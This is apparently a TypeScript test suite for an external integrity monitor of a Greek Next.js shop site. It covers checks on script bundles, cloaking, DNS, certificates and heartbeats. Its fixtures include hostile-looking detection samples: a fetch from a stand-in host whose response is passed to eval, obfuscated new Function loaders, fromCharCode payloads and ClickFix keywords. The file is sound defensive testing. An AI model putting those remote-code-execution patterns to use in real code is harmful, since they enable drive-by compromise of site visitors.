import { test } from "node:test";
import assert from "node:assert/strict";
import { sha256Hex } from "./rules";
import {
  athensDay, chunkHashDiff, chunkIntegrity, chunkRefs, cloakingDiff, diffDns, heartbeatVerdict, newCerts, parseCertSpotter, parseCrtSh,
  robotsVerdict, scanChunk, scriptSet, seededPick, selectPages, sitemapVerdict, watchCheckOf, zarazProbe, zarazRefs, renderWatchEmail, lightAlerts, dnsRecords,
} from "./watch-core";

const ORIGIN = "https://euronics.dgsoft.gr";
const sev = (fs: { severity: string }[]) => fs.map((f) => f.severity).sort();
const has = (fs: { severity: string; title: string }[], s: string, re: RegExp) => fs.some((f) => f.severity === s && re.test(f.title));

// ── επιλογή σελίδων ─────────────────────────────────────────────────────────────────────────────────────────────────
test("seededPick: ίδιο seed → ίδια επιλογή· άλλη μέρα → άλλη· χωρίς διπλά, έως n", () => {
  const xs = Array.from({ length: 40 }, (_, i) => `/proion/p${i}`);
  const a = seededPick(xs, 20, "2026-10-20"), b = seededPick(xs, 20, "2026-10-20"), c = seededPick(xs, 20, "2026-10-21");
  assert.deepEqual(a, b);
  assert.notDeepEqual(a, c);
  assert.equal(new Set(a).size, 20);
  assert.ok(a.every((x) => xs.includes(x)));
  assert.equal(seededPick(xs.slice(0, 3), 20, "x").length, 3);
  assert.deepEqual(seededPick([], 5, "x"), []);
});

test("selectPages: 10 κατηγορίες + 20 προϊόντα από το pool, σταθερά μέσα στη μέρα, χωρίς διπλά", () => {
  const pool = { categories: Array.from({ length: 13 }, (_, i) => `/k/c${i}`), products: Array.from({ length: 50 }, (_, i) => `/proion/p${i}`) };
  const s = selectPages(pool, "2026-10-20");
  assert.equal(s.categories.length, 10);
  assert.equal(s.products.length, 20);
  assert.deepEqual(selectPages({ categories: [...pool.categories].reverse(), products: [...pool.products, ...pool.products] }, "2026-10-20"), s); // ανεξάρτητο από σειρά/διπλά
  assert.deepEqual(selectPages({ categories: ["/k/a"], products: [] }, "x"), { categories: ["/k/a"], products: [] });
});

test("athensDay: ημερομηνία σε ώρα Ελλάδας (UTC+3 το καλοκαίρι, UTC+2 τον χειμώνα)", () => {
  assert.equal(athensDay(new Date("2026-10-19T21:30:00Z")), "2026-10-20"); // 00:30 Αθήνα (θερινή)
  assert.equal(athensDay(new Date("2026-12-19T21:30:00Z")), "2026-12-19"); // 23:30 Αθήνα (χειμερινή)
});

// ── chunks ──────────────────────────────────────────────────────────────────────────────────────────────────────────
test("chunkRefs: scripts /_next/static του ίδιου origin — και όσα αναφέρει το RSC payload — μοναδικά, χωρίς ξένα/CSS", () => {
  const html = `<script src="/_next/static/chunks/a.js"></script><script src="https://euronics.dgsoft.gr/_next/static/chunks/b.js?dpl=1"></script>`
    + `<script src="https://evil.example/_next/static/chunks/x.js"></script><link href="/_next/static/chunks/s.css">`
    + `<script>self.__next_f.push([1,"I[1,[\\"/_next/static/chunks/c.js\\",\\"/_next/static/chunks/a.js\\"]]"])</script>`;
  assert.deepEqual(chunkRefs(html, ORIGIN), ["/_next/static/chunks/a.js", "/_next/static/chunks/b.js", "/_next/static/chunks/c.js"]);
});

test("chunkIntegrity: 200 + JS → ok· ανακατεύθυνση σε ξένο host → critical· 404 → warn· HTML αντί για JS → warn· σφάλμα → error", () => {
  assert.deepEqual(chunkIntegrity([{ path: "/_next/static/chunks/a.js", status: 200, contentType: "application/javascript; charset=UTF-8" }]), []);
  const f = chunkIntegrity([
    { path: "/_next/static/chunks/a.js", status: 302, redirectTo: "https://evil.example/a.js" },
    { path: "/_next/static/chunks/b.js", status: 404, contentType: "text/html" },
    { path: "/_next/static/chunks/c.js", status: 404, contentType: "text/html" },
    { path: "/_next/static/chunks/d.js", status: 200, contentType: "text/html; charset=utf-8" },
    { path: "/_next/static/chunks/e.js", error: "timeout" },
  ]);
  assert.deepEqual(sev(f), ["critical", "error", "warn", "warn"]);
  const missing = f.find((x) => /δεν σερβίρεται/.test(x.title))!;
  assert.equal(missing.evidence, "/_next/static/chunks/b.js, /_next/static/chunks/c.js"); // ένα εύρημα, σταθερό τεκμήριο
});

test("chunkHashDiff: ίδιο αρχείο με άλλο περιεχόμενο ανά user agent → critical· ίδια → τίποτα", () => {
  assert.deepEqual(chunkHashDiff({ "/a.js": "11", "/b.js": "22" }, { "/a.js": "11" }), []);
  const f = chunkHashDiff({ "/a.js": "11" }, { "/a.js": "99" }, "Windows Chrome");
  assert.equal(f.length, 1);
  assert.equal(f[0].severity, "critical");
  assert.equal(f[0].evidence, "/a.js");
});

// ── scanChunk ───────────────────────────────────────────────────────────────────────────────────────────────────────
const LIB = `!function(){var g=Function("return this")();var x="http://www.w3.org/2000/svg";fetch("/api/cart");console.log("https://nextjs.org/docs");var t=[${Array.from({ length: 40 }, (_, i) => i).join(",")}];}();`;

test("scanChunk: νόμιμο bundle (Function(\"return this\"), fetch, γνωστά domains, πίνακας αριθμών χωρίς fromCharCode) → τίποτα", () => {
  assert.deepEqual(scanChunk(LIB), []);
  // new Function + fetch (θα ταίριαζε στο CLICKFIX_MARKERS) δεν είναι εύρημα σε bundle
  assert.deepEqual(scanChunk(`var f=new Function("a","return a");fetch("/x");`), []);
});

test("scanChunk: άγνωστο domain → warn (ένα ανά host)· γνωστό/υποτομέας → τίποτα", () => {
  const f = scanChunk(`a="https://cdn.evil-cdn.example/x.js";b="https://cdn.evil-cdn.example/y";c="https://www.googletagmanager.com/gtag/js";d="https://i.ytimg.com/vi"`);
  assert.deepEqual(sev(f), ["warn"]);
  assert.equal(f[0].evidence, "cdn.evil-cdn.example");
  assert.deepEqual(scanChunk(`a="https://googletagmanager.com.evil.example/x"`).map((x) => x.evidence), ["googletagmanager.com.evil.example"]);
});

test("scanChunk: eval / new Function με δυναμικό όρισμα — μόνο του τίποτα· με άγνωστο domain ή συγκάλυψη → critical", () => {
  assert.deepEqual(scanChunk(`function r(s){return eval(s)}`), []);
  assert.deepEqual(scanChunk(`var f=new Function(code)`), []);
  assert.ok(has(scanChunk(`fetch("https://bad.example/p").then(r=>r.text()).then(t=>eval(t))`), "critical", /eval/));
  const obf = `var _0x1a2b=['a'],_0x3c4d=1,_0x5e6f=2,_0x7a8b=3,_0x9c0d=4,_0x1e2f=5,_0x3a4b=6,_0x5c6d=7,_0x7e8f=8,_0x9a0b=9;new Function(_0x1a2b[0])();`;
  assert.ok(has(scanChunk(obf), "critical", /eval|Function/));
});

test("scanChunk: συγκάλυψη μόνη της → warn", () => {
  const f = scanChunk(`var _0x1a2b=1,_0x3c4d=1,_0x5e6f=2,_0x7a8b=3,_0x9c0d=4,_0x1e2f=5,_0x3a4b=6,_0x5c6d=7,_0x7e8f=8,_0x9a0b=9;`);
  assert.deepEqual(sev(f), ["warn"]);
});

test("scanChunk: base64 > 20 KB → warn· μικρό → τίποτα", () => {
  const blob = "QUJD".repeat(5200 + 10); // > 20 KB
  assert.ok(has(scanChunk(`var x="${blob}";`), "warn", /base64/));
  assert.deepEqual(scanChunk(`var x="${"QUJD".repeat(100)}";`), []);
});

test("scanChunk: γνωστό base64 βιβλιοθήκης (sha256 στη λίστα) → τίποτα· placeholders (.invalid) → τίποτα", () => {
  const blob = "QUJD".repeat(5210);
  assert.deepEqual(scanChunk(`var x="${blob}";`, {}).length, 1);
  assert.deepEqual(scanChunk(`var x="${blob}";`, { knownBase64: [sha256Hex(blob)] }), []);
  assert.deepEqual(scanChunk(`new URL(u,"http://same-origin.invalid")`), []);
});

test("scanChunk: ισχυροί δείκτες (CapEmbed, posthoganalytics, localStorage 'verified' + fetch, char codes ≥30 → fromCharCode) → critical", () => {
  assert.ok(has(scanChunk(`window.CapEmbed={init(){}}`), "critical", /CapEmbed/));
  assert.ok(has(scanChunk(`x="https://us.posthoganalytics.com/e"`), "critical", /posthoganalytics/));
  assert.ok(has(scanChunk(`if(!localStorage.getItem('verified')){fetch('/x')}`), "critical", /verified/));
  assert.deepEqual(scanChunk(`if(!localStorage.getItem('verified')){}`), []); // χωρίς fetch
  const codes = Array.from({ length: 30 }, (_, i) => 65 + (i % 26)).join(",");
  assert.ok(has(scanChunk(`var s=[${codes}].map(function(c){return String.fromCharCode(c)}).join("")`), "critical", /char codes/));
  assert.ok(has(scanChunk(`var s=String.fromCharCode(${codes})`), "critical", /char codes/));
  assert.deepEqual(scanChunk(`var s=String.fromCharCode(${Array.from({ length: 29 }, () => 65).join(",")})`), []); // 29 → όχι
});

test("scanChunk: ClickFix λέξεις του policy ΔΕΝ εφαρμόζονται σε bundles (Ctrl+V σε βοήθεια editor)", () => {
  assert.deepEqual(scanChunk(`var help="Press Ctrl+V to paste, Win+R opens Run, use powershell";`), []);
});

// ── cloaking ────────────────────────────────────────────────────────────────────────────────────────────────────────
const pageWith = (extra: string) => `<script src="/_next/static/chunks/a.js" nonce="N"></script><script nonce="N">self.__next_f.push([1,"x"])</script>${extra}`;

test("scriptSet + cloakingDiff: ίδια σελίδα → τίποτα· άλλα chunks /_next/static (mobile/desktop) → τίποτα", () => {
  const a = scriptSet(pageWith(""), ORIGIN), b = scriptSet(pageWith(`<script src="/_next/static/chunks/mobile.js" nonce="N"></script>`), ORIGIN);
  assert.deepEqual(cloakingDiff(a, a), []);
  assert.deepEqual(cloakingDiff(a, b), []);
});

test("cloakingDiff: script από ξένο host / Zaraz / inline χωρίς nonce μόνο σε ένα UA → critical", () => {
  const base = scriptSet(pageWith(""), ORIGIN);
  for (const extra of [`<script src="https://evil.example/x.js"></script>`, `<script nonce="Z">zaraz.init("/cdn-cgi/zaraz/s.js")</script>`, `<script>alert(1)</script>`]) {
    const f = cloakingDiff(base, scriptSet(pageWith(extra), ORIGIN), ["φύλακας", "Windows Chrome"]);
    assert.equal(f.length, 1, extra);
    assert.equal(f[0].severity, "critical");
    assert.match(f[0].detail, /Windows Chrome/);
  }
});

test("cloakingDiff: loader του JS detections χωρίς nonce μόνο για browser → warn (όχι «inline χωρίς nonce» critical)", () => {
  const jsd = `<script>(function(){window.__CF$cv$params={r:'1'};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.head.appendChild(a);})();</script>`;
  assert.deepEqual(sev(cloakingDiff(scriptSet(pageWith(""), ORIGIN), scriptSet(pageWith(jsd), ORIGIN))), ["warn"]);
});

test("cloakingDiff: διαφορά μόνο στο Email Obfuscation του Cloudflare → warn", () => {
  const f = cloakingDiff(scriptSet(pageWith(""), ORIGIN), scriptSet(pageWith(`<script src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>`), ORIGIN));
  assert.deepEqual(sev(f), ["warn"]);
});

// ── Zaraz ───────────────────────────────────────────────────────────────────────────────────────────────────────────
test("zarazRefs: οι διευθύνσεις του loader όπως γράφονται στη σελίδα (με το z), μόνο του ίδιου origin", () => {
  const html = `<script src="/cdn-cgi/zaraz/s.js?z=JTdCJTIy"></script><script>var u="/cdn-cgi/zaraz/i.js";</script><script src="https://evil.example/cdn-cgi/zaraz/s.js"></script>`;
  assert.deepEqual(zarazRefs(html, ORIGIN), ["/cdn-cgi/zaraz/i.js", "/cdn-cgi/zaraz/s.js?z=JTdCJTIy"]);
  assert.deepEqual(zarazRefs(`<p>τίποτα</p>`, ORIGIN), []);
});

test("zarazProbe: 404 → ok· 200 JS → critical· έλεγχος Cloudflare → error· άλλο → warn", () => {
  assert.deepEqual(zarazProbe({ status: 404, headers: { server: "cloudflare" }, body: "<html>404</html>" }), []);
  assert.ok(has(zarazProbe({ status: 200, headers: { "content-type": "application/javascript" }, body: "zaraz.init()" }), "critical", /Zaraz/));
  assert.deepEqual(sev(zarazProbe({ status: 403, headers: { server: "cloudflare", "cf-mitigated": "challenge" }, body: "" })), ["error"]);
  assert.deepEqual(sev(zarazProbe({ status: 400, headers: {}, body: "" })), ["warn"]);
  assert.deepEqual(sev(zarazProbe({ error: "timeout" })), ["error"]);
});

// ── robots / sitemap ───────────────────────────────────────────────────────────────────────────────────────────────
test("robotsVerdict: κανονικό → τίποτα· Sitemap σε ξένο host / HTML → warn· σφάλμα → error", () => {
  const ok = { status: 200, headers: { "content-type": "text/plain" }, body: "User-Agent: *\nAllow: /\nDisallow: /admin\n" };
  assert.deepEqual(robotsVerdict(ok, ORIGIN), []);
  assert.deepEqual(sev(robotsVerdict({ ...ok, body: `${ok.body}Sitemap: https://spam.example/sitemap.xml\n` }, ORIGIN)), ["warn"]);
  assert.deepEqual(sev(robotsVerdict({ ...ok, body: "<html><script>x</script></html>" }, ORIGIN)), ["warn"]);
  assert.deepEqual(sev(robotsVerdict({ error: "timeout" }, ORIGIN)), ["error"]);
});

test("sitemapVerdict: 404 → τίποτα (η εφαρμογή δεν έχει sitemap)· 200 → warn, ξένα URLs στο τεκμήριο", () => {
  assert.deepEqual(sitemapVerdict({ status: 404, headers: {}, body: "" }, ORIGIN).findings, []);
  const r = sitemapVerdict({ status: 200, headers: { "content-type": "application/xml" }, body: `<urlset><url><loc>${ORIGIN}/k/a</loc></url><url><loc>https://spam.example/x</loc></url></urlset>` }, ORIGIN);
  assert.equal(r.count, 2);
  assert.deepEqual(sev(r.findings), ["warn", "warn"]);
});

// ── DNS ─────────────────────────────────────────────────────────────────────────────────────────────────────────────
const BASE = {
  "euronics.dgsoft.gr A": ["104.21.35.244", "172.67.181.125"],
  "dgsoft.gr A": ["5.189.130.31"],
  "dgsoft.gr NS": ["art.ns.cloudflare.com", "rose.ns.cloudflare.com"],
  "dgsoft.gr MX": ["0 dgsoft-gr.mail.protection.outlook.com"],
  "dgsoft.gr TXT": ["v=spf1 include:spf.protection.outlook.com include:mailgun.org ~all"],
  "dgsoft.gr CAA": [],
  "_dmarc.dgsoft.gr TXT": [],
};

test("diffDns: ίδιο (άλλη σειρά) → τίποτα", () => {
  assert.deepEqual(diffDns(BASE, { ...BASE, "euronics.dgsoft.gr A": ["172.67.181.125", "104.21.35.244"] }), []);
});

test("diffDns: αλλαγή A/NS/MX/CNAME → critical· TXT/CAA → warn", () => {
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "dgsoft.gr A": ["6.6.6.6"] })), ["critical"]);
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "dgsoft.gr NS": ["ns1.evil.example"] })), ["critical"]);
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "dgsoft.gr MX": ["10 mx.evil.example"] })), ["critical"]);
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "euronics.dgsoft.gr CNAME": ["evil.example"] })), ["critical"]); // νέα εγγραφή που δεν υπήρχε
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "dgsoft.gr TXT": ["v=spf1 include:evil.example ~all"] })), ["warn"]);
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "dgsoft.gr CAA": ['0 issue "evil-ca.example"'] })), ["warn"]);
  const f = diffDns(BASE, { ...BASE, "dgsoft.gr A": ["6.6.6.6"] })[0];
  assert.match(f.detail, /5\.189\.130\.31/);
  assert.match(f.detail, /6\.6\.6\.6/);
});

test("diffDns: αλλαγή A μέσα στις IP του Cloudflare (proxied) → warn, όχι critical· προς μη-Cloudflare → critical", () => {
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "euronics.dgsoft.gr A": ["104.21.1.1", "172.67.2.2"] })), ["warn"]);
  assert.deepEqual(sev(diffDns(BASE, { ...BASE, "euronics.dgsoft.gr A": ["104.21.1.1", "8.8.8.8"] })), ["critical"]);
});

test("diffDns: απρόσμενο NXDOMAIN → warn· αναμενόμενο (κενό στη baseline) → τίποτα· άλλο σφάλμα → error", () => {
  assert.deepEqual(sev(diffDns(BASE, { ...BASE }, { "dgsoft.gr A": "NXDOMAIN" })), ["warn"]);
  assert.deepEqual(diffDns(BASE, { ...BASE }, { "_dmarc.dgsoft.gr TXT": "NXDOMAIN" }), []);
  assert.deepEqual(sev(diffDns(BASE, { ...BASE }, { "dgsoft.gr MX": "ETIMEOUT" })), ["error"]);
});

test("dnsRecords: κανονικοποίηση απαντήσεων node:dns (TXT ενωμένα, MX «prio host», CAA, πεζά, χωρίς τελεία)", () => {
  assert.deepEqual(dnsRecords("TXT", [["v=spf1 ", "~all"], ["MS=1"]]), ["MS=1", "v=spf1 ~all"]);
  assert.deepEqual(dnsRecords("MX", [{ priority: 0, exchange: "Mail.Example.COM." }]), ["0 mail.example.com"]);
  assert.deepEqual(dnsRecords("CAA", [{ critical: 0, issue: "letsencrypt.org" }]), ['0 issue "letsencrypt.org"']);
  assert.deepEqual(dnsRecords("NS", ["B.ns.example.", "a.ns.example"]), ["a.ns.example", "b.ns.example"]);
});

// ── Certificate Transparency ───────────────────────────────────────────────────────────────────────────────────────
test("newCerts: πιστοποιητικό των 2 τελευταίων ημερών για άγνωστο όνομα → warn· γνωστό/παλιό → τίποτα", () => {
  const now = new Date("2026-10-20T07:30:00Z");
  const entries = [
    { names: ["euronics.dgsoft.gr"], notBefore: "2026-10-19T10:00:00Z", issuer: "Google Trust Services" },
    { names: ["login-dgsoft.gr.evil.example", "pay.dgsoft.gr"], notBefore: "2026-10-19T12:00:00Z", issuer: "R3" },
    { names: ["old.dgsoft.gr"], notBefore: "2026-10-10T12:00:00Z", issuer: "R3" },
  ];
  const f = newCerts(entries, ["euronics.dgsoft.gr", "*.dgsoft.gr"], now);
  assert.deepEqual(sev(f), ["warn"]);
  assert.match(f[0].evidence!, /pay\.dgsoft\.gr/);
});

test("parseCrtSh / parseCertSpotter: κοινή μορφή", () => {
  assert.deepEqual(parseCrtSh([{ name_value: "a.dgsoft.gr\n*.dgsoft.gr", not_before: "2026-10-19T10:00:00", issuer_name: "C=US, O=Let's Encrypt, CN=R3" }]),
    [{ names: ["*.dgsoft.gr", "a.dgsoft.gr"], notBefore: "2026-10-19T10:00:00Z", issuer: "C=US, O=Let's Encrypt, CN=R3" }]);
  assert.deepEqual(parseCertSpotter([{ dns_names: ["b.dgsoft.gr"], not_before: "2026-10-19T10:00:00Z" }]), [{ names: ["b.dgsoft.gr"], notBefore: "2026-10-19T10:00:00Z", issuer: "" }]);
  assert.throws(() => parseCrtSh({ error: 1 }));
});

// ── heartbeat ──────────────────────────────────────────────────────────────────────────────────────────────────────
const AT = new Date("2026-10-20T05:30:00Z"); // 08:30 Αθήνα
const run = (iso: string, status = "ok") => ({ id: "r1", startedAt: iso, status });
const hb = (body: unknown) => ({ kind: "ok" as const, body });

test("heartbeatVerdict: full σήμερα + light πρόσφατο → τίποτα", () => {
  assert.deepEqual(heartbeatVerdict(hb({ lastFull: run("2026-10-20T04:00:00Z"), lastLight: run("2026-10-20T05:05:00Z"), alertsUndelivered: false }), AT, "ok"), []);
});

test("heartbeatVerdict: κανένα full σήμερα μετά τις 08:00 → critical «δεν έτρεξε σήμερα»· πριν τις 08:00 αρκεί το χθεσινό", () => {
  const body = { lastFull: run("2026-10-19T04:00:00Z"), lastLight: run("2026-10-20T05:05:00Z"), alertsUndelivered: false };
  assert.ok(has(heartbeatVerdict(hb(body), AT, "ok"), "critical", /δεν έτρεξε σήμερα/));
  assert.deepEqual(heartbeatVerdict(hb(body), new Date("2026-10-20T04:30:00Z"), "ok"), []); // 07:30 Αθήνα
  assert.ok(has(heartbeatVerdict(hb({ ...body, lastFull: run("2026-10-18T04:00:00Z") }), new Date("2026-10-20T04:30:00Z"), "ok"), "critical", /δεν έτρεξε/));
  assert.ok(has(heartbeatVerdict(hb({ ...body, lastFull: null }), AT, "ok"), "critical", /δεν έτρεξε σήμερα/));
});

test("heartbeatVerdict: εσωτερικό ΟΚ ενώ ο φύλακας βρίσκει κρίσιμο → critical· εσωτερικό critical → όχι", () => {
  const body = { lastFull: run("2026-10-20T04:00:00Z"), lastLight: run("2026-10-20T05:05:00Z"), alertsUndelivered: false };
  assert.ok(has(heartbeatVerdict(hb(body), AT, "critical"), "critical", /λέει ΟΚ ενώ ο εξωτερικός βρίσκει κρίσιμο/));
  assert.deepEqual(heartbeatVerdict(hb({ ...body, lastLight: run("2026-10-20T05:05:00Z", "critical") }), AT, "critical"), []);
  assert.deepEqual(heartbeatVerdict(hb(body), AT, "warn"), []);
});

test("heartbeatVerdict: alertsUndelivered → warn· light παλιό → warn", () => {
  const body = { lastFull: run("2026-10-20T04:00:00Z"), lastLight: run("2026-10-20T05:05:00Z"), alertsUndelivered: true };
  assert.deepEqual(sev(heartbeatVerdict(hb(body), AT, "ok")), ["warn"]);
  assert.deepEqual(sev(heartbeatVerdict(hb({ ...body, alertsUndelivered: false, lastLight: run("2026-10-20T01:05:00Z") }), AT, "ok")), ["warn"]);
});

test("heartbeatVerdict: 401 / 404 / 500 / χωρίς απάντηση / άκυρη απάντηση → critical «Δεν απαντά»· 503 → warn· χωρίς μυστικό → error", () => {
  for (const x of [{ kind: "http" as const, status: 401 }, { kind: "http" as const, status: 404 }, { kind: "http" as const, status: 500 }, { kind: "unreachable" as const, error: "ECONNRESET" }, hb({ nope: 1 })]) {
    const f = heartbeatVerdict(x, AT, "ok");
    assert.equal(f.length, 1, JSON.stringify(x));
    assert.equal(f[0].severity, "critical");
    assert.match(f[0].title, /Δεν απαντά ο εσωτερικός έλεγχος/);
  }
  assert.deepEqual(sev(heartbeatVerdict({ kind: "http", status: 503 }, AT, "ok")), ["warn"]);
  assert.deepEqual(sev(heartbeatVerdict({ kind: "nosecret" }, AT, "ok")), ["error"]);
});

// ── αναφορά / email ────────────────────────────────────────────────────────────────────────────────────────────────
test("watchCheckOf: κατάσταση από τα ευρήματα", () => {
  const c = watchCheckOf("dns", "DNS", "σύνοψη", [{ severity: "warn", title: "t", detail: "d" }], 5);
  assert.equal(c.status, "warn");
  assert.equal(watchCheckOf("x", "X", "s", [], 1).status, "ok");
});

test("renderWatchEmail: escape παντού, θέμα με κατάσταση", () => {
  const checks = [watchCheckOf("pages", "Σελίδες", "<b>σύνοψη</b>", [{ severity: "critical", title: "<script>alert(1)</script>", detail: "x & y", evidence: "\"q\"" }], 5)];
  const m = renderWatchEmail({ mode: "full", status: "critical", startedAt: new Date("2026-10-20T04:30:00Z"), finishedAt: new Date("2026-10-20T04:32:00Z"), site: ORIGIN, checks, notes: ["<i>σημείωση</i>"] }, "https://github.com/x/y/actions/runs/1?a=1&b=2");
  assert.match(m.subject, /Εξωτερικός φύλακας 20\/10: ΚΡΙΣΙΜΟ/);
  assert.ok(!m.html.includes("<script>alert(1)"));
  assert.ok(m.html.includes("&lt;script&gt;"));
  assert.ok(!m.html.includes("<b>σύνοψη"));
  assert.ok(!m.html.includes("<i>σημείωση"));
  assert.ok(m.html.includes("a=1&amp;b=2"));
  assert.match(m.text, /ΚΡΙΣΙΜΟ/);
});

test("lightAlerts: μόνο κρίσιμα, όχι αν στάλθηκαν τις τελευταίες 23 ώρες", () => {
  const now = new Date("2026-10-20T10:15:00Z");
  const checks = [watchCheckOf("pages", "Σελίδες", "s", [{ severity: "critical", title: "A", detail: "d", evidence: "e" }, { severity: "warn", title: "B", detail: "d" }], 1),
    watchCheckOf("zaraz", "Zaraz", "s", [{ severity: "critical", title: "C", detail: "d" }], 1)];
  const all = lightAlerts(checks, {}, now);
  assert.equal(all.length, 2);
  const sent = Object.fromEntries(all.slice(0, 1).map((a) => [a.fp, "2026-10-20T09:15:00Z"]));
  assert.deepEqual(lightAlerts(checks, sent, now).map((a) => a.f.title), ["C"]);
  assert.equal(lightAlerts(checks, Object.fromEntries(all.map((a) => [a.fp, "2026-10-19T09:00:00Z"])), now).length, 2); // > 23 ώρες
});
